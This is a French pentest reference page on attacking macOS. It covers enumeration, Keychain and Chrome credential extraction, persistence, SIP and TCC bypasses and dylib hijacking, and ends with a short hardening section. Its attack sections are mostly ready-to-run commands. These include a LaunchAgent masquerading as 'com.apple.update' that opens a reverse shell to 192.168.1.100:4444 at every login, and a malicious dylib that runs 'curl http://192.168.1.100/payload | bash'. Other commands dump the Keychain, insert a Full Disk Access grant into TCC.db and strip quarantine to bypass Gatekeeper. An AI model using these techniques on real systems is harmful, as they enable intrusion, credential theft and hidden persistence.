---
title: macOS Security
domain: sciences-appliquées
subdomain: informatique / sécurité / platform-security
tags: [macos, osx, pentest, persistence, keychain, sip, launchagent, sécurité]
date: 2026-03-23
---

# macOS Security

macOS intègre plusieurs couches de sécurité spécifiques (SIP, Gatekeeper, TCC, Keychain). Un pentest macOS nécessite de comprendre ces mécanismes pour les contourner ou les exploiter. Les vecteurs d'entrée courants sont le phishing, les apps malveillantes, et les exploits applicatifs.

## Architecture de sécurité macOS

```
Couches de sécurité macOS :

  SIP (System Integrity Protection) :
    → Protège les fichiers et dossiers système contre toute modification
    → Même root ne peut pas modifier /System, /usr, /bin, /sbin
    → Actif par défaut depuis macOS 10.11 El Capitan
    → Désactivable seulement en Recovery Mode

  Gatekeeper :
    → Vérifie que les apps téléchargées sont signées par un développeur Apple
    → Notarisation requise depuis macOS 10.15 Catalina
    → Bypass possible : xattr -d com.apple.quarantine app.app

  TCC (Transparency, Consent, and Control) :
    → Contrôle l'accès aux données sensibles : contacts, calendrier, Photos, micro, webcam
    → Base de données : ~/Library/Application Support/com.apple.TCC/TCC.db
    → Demandes d'autorisation via boîtes de dialogue système

  Sandbox :
    → Apps App Store sandboxées (accès restreint au système de fichiers)
    → Apps téléchargées hors App Store → pas de sandbox obligatoire

  Keychain :
    → Gestionnaire de mots de passe intégré
    → Stockage chiffré des credentials, certificats, clés SSH
    → Accessible via security CLI ou API Security.framework
```

## Reconnaissance et énumération

```bash
# Informations système de base
sw_vers                             # Version macOS
uname -a                            # Kernel version
system_profiler SPHardwareDataType  # Matériel
ifconfig                            # Interfaces réseau
netstat -an                         # Connexions actives

# Utilisateurs locaux
dscl . list /Users | grep -v "^_"   # Comptes non-système
dscl . read /Users/USERNAME         # Détails d'un compte
id                                  # Groupes de l'utilisateur courant
groups                              # Groupes de l'utilisateur courant

# Processus et services
ps aux                              # Processus en cours
launchctl list                      # Services LaunchAgents/LaunchDaemons actifs

# Répertoires d'intérêt
ls ~/Library/                       # Données applicatives
ls ~/Library/Application\ Support/
ls ~/Library/Preferences/
ls /Library/LaunchAgents/           # Agents de tous les utilisateurs
ls /Library/LaunchDaemons/          # Daemons système (root)
ls ~/Library/LaunchAgents/          # Agents de l'utilisateur courant

# Applications installées
ls /Applications/
system_profiler SPApplicationsDataType

# Partages réseau
sharing -l                          # Partages actifs
```

## Keychain — Extraction de credentials

```bash
# Lister les items du Keychain
security list-keychains
security dump-keychain -d login.keychain-db   # Dump (demande confirmation utilisateur)

# Extraire des mots de passe spécifiques
security find-internet-password -s "github.com" -g
security find-generic-password -a "alice" -s "MyApp" -g

# Clés SSH dans le Keychain (macOS 12+)
security find-generic-password -s "SSH: KEY" -a "KEYNAME" -g

# Chaincbreaker — extraction offline du Keychain (sans prompt)
# Nécessite la clé de déchiffrement (disponible via DPAPI-like attacks)
# python3 chainbreaker.py --dump-all --key=MASTER_KEY login.keychain-db

# Keychain-dumper (si root obtenu)
# Extrait tous les passwords du Keychain de l'utilisateur
# Nécessite de contourner TCC ou d'avoir full-disk access

# Via memory (si process a accès)
# Les apps avec accès keychain peuvent lire les secrets en clair depuis la mémoire

# Credential Manager navigateurs
# Chrome : ~/Library/Application Support/Google/Chrome/Default/Login Data (SQLite)
sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data \
    "SELECT origin_url, username_value, password_value FROM logins"
# Les passwords sont chiffrés par Keychain → nécessite déchiffrement
```

## Persistance macOS

### LaunchAgents et LaunchDaemons

```bash
# LaunchAgent — exécuté au login de l'utilisateur
# LaunchDaemon — exécuté au boot (root), sans utilisateur connecté

# Emplacements :
# ~/Library/LaunchAgents/          → user, login user
# /Library/LaunchAgents/           → tous les users (nécessite admin)
# /Library/LaunchDaemons/          → root, boot (nécessite root)
# /System/Library/LaunchAgents/    → Apple, protégé par SIP
# /System/Library/LaunchDaemons/   → Apple, protégé par SIP

# Créer un LaunchAgent de persistance (reverse shell à chaque login)
cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/192.168.1.100/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>60</integer>
</dict>
</plist>
EOF

# Charger le LaunchAgent
launchctl load ~/Library/LaunchAgents/com.apple.update.plist

# Démarrer manuellement
launchctl start com.apple.update
```

### Autres vecteurs de persistance

```bash
# Cron (limité sur macOS moderne)
crontab -l
crontab -e
# → TCC prompt si accès à certains répertoires

# Login Items — applications lancées au login de l'utilisateur
# Accessible via : Préférences Système → Comptes → Ouverture
osascript -e 'tell application "System Events" to make new login item at end \
    with properties {path:"/tmp/payload.app", hidden:true}'

# Emond (Event Monitor Daemon) — rarement audité
# /etc/emond.d/rules/*.plist
# Déclenche des actions sur des événements système

# Periodic scripts — exécutés périodiquement par launchd
ls /etc/periodic/daily/
ls /etc/periodic/weekly/
ls /etc/periodic/monthly/
# Ajouter un script dans /etc/periodic/daily/ (root requis)

# Profils de configuration MDM
# Un profil MDM malveillant peut installer des certs, des LaunchDaemons, etc.
profiles list
profiles show -all
```

## SIP — Vérification et contournement

```bash
# Vérifier l'état de SIP
csrutil status
# → System Integrity Protection status: enabled/disabled

# Désactiver SIP (nécessite Recovery Mode)
# Redémarrer en Recovery Mode (Apple Silicon : maintenir bouton power)
# Terminal → csrutil disable
# Redémarrer

# Vérification de l'intégrité des fichiers système
csrutil report                    # Rapport détaillé

# Contournements partiels de SIP (sans désactivation) :
# 1. Binaries non protégés : /usr/local/, /tmp/, ~/
# 2. Environnement de bibliothèques (DYLD_INSERT_LIBRARIES) :
#    → Interdit sur les binaires SIP-protégés
#    → Possible sur les binaires de l'utilisateur
export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib
./vulnerable_binary

# 3. Injection via des binaires setuid vulnérables
find / -perm -4000 2>/dev/null    # Binaires SUID
```

## TCC — Contournement et exploitation

```bash
# Base de données TCC
# ~/Library/Application Support/com.apple.TCC/TCC.db (user)
# /Library/Application Support/com.apple.TCC/TCC.db (system)

# Lire la TCC (nécessite Full Disk Access ou root)
sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT client, service, auth_value FROM access"

# Ajouter une app à la TCC manuellement (si Full Disk Access disponible)
sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "INSERT OR REPLACE INTO access VALUES('kTCCServiceFullDiskAccess','com.evil.app',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,1687000000)"

# Techniques d'escalade TCC :
# 1. Via une app légitime ayant déjà les permissions (Finder, Terminal, iTerm2...)
# 2. CVE de type TCC bypass — nombreux historiquement (procédure de substitution d'app)
# 3. Via des scripts AppleScript exécutés depuis une app privilégiée
osascript -e 'tell application "Finder" to POSIX file "/etc/hosts"'

# Finder a Full Disk Access → executer des opérations via Finder via AppleScript
```

## Exploitation applicative macOS

```bash
# Vérifier les protections des binaires
codesign -d --entitlements :- /Applications/App.app   # Entitlements
codesign -v /Applications/App.app                      # Vérifier la signature
otool -l /Applications/App.app/Contents/MacOS/App | grep -A4 LC_RPATH  # RPATHs

# Hijacking de bibliothèques (DYLIB Hijacking)
# Si une app charge une bibliothèque depuis un RPATH contrôlable
otool -L /usr/local/bin/app    # Bibliothèques chargées
# Si /usr/local/lib/libexample.dylib n'existe pas → créer la bibliothèque malveillante

# Compiler une dylib malveillante
cat > evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor)) void evil_init() {
    system("curl http://192.168.1.100/payload | bash");
}
EOF
gcc -dynamiclib -o /usr/local/lib/libexample.dylib evil.c

# Vérifier les applications non signées
spctl -a -t exec -vv /Applications/App.app
# Bypass Gatekeeper (retirer l'attribut quarantaine)
xattr -d com.apple.quarantine /Applications/App.app
```

## Outils de pentest macOS

```bash
# SwiftBelt — énumération système macOS
# (équivalent de Seatbelt pour macOS)
./SwiftBelt

# macOS-scripts — collection de scripts offensifs
# Reconnaissance, extraction de credentials, persistance

# Mythic + Poseidon agent — C2 natif macOS (Go)
# Poseidon : agent Go ciblant macOS/Linux

# Orchard — framework post-exploitation macOS

# PurpleCloud — simulation d'attaque macOS (éducatif)

# Analyse statique d'applications macOS
jtool2 -d /Applications/App.app/Contents/MacOS/App   # Désassemblage
class-dump /Applications/App.app    # Classes Objective-C
```

## Contre-mesures

```
Hardening macOS :
  ✓ Activer FileVault (chiffrement du disque) — protection des données au repos
  ✓ SIP activé — ne jamais désactiver en production
  ✓ Gatekeeper : mode "App Store uniquement" pour les utilisateurs standard
  ✓ Firmware password — empêche le boot en Recovery Mode par des tiers
  ✓ Désactiver le partage de bureau à distance si non utilisé

TCC :
  ✓ Revue régulière des apps ayant Full Disk Access, Contacts, etc.
  ✓ Révoquer les accès inutiles : Préférences Système → Confidentialité & Sécurité
  ✓ MDM : politiques TCC centralisées (PPPC — Privacy Preferences Policy Control)

Monitoring :
  ✓ KnockKnock (Objective-See) — scanner les points de persistance
  ✓ Oversight (Objective-See) — surveiller l'accès à la webcam et au micro
  ✓ RansomWhere (Objective-See) — détecter le chiffrement de masse de fichiers
  ✓ LuLu — pare-feu open-source macOS (contrôle des connexions sortantes par app)
  ✓ Logs : ~/Library/Logs/, /var/log/, Console.app
  ✓ Unified Logging : log stream --predicate 'process == "suspicious_app"'

MDM (Mobile Device Management) :
  ✓ Déployer MDM (Jamf, Mosyle, Kandji) pour la gestion centralisée
  ✓ Interdire l'installation d'apps non signées via MDM
  ✓ Chiffrement forcé, mot de passe complexe, timeout de session
```
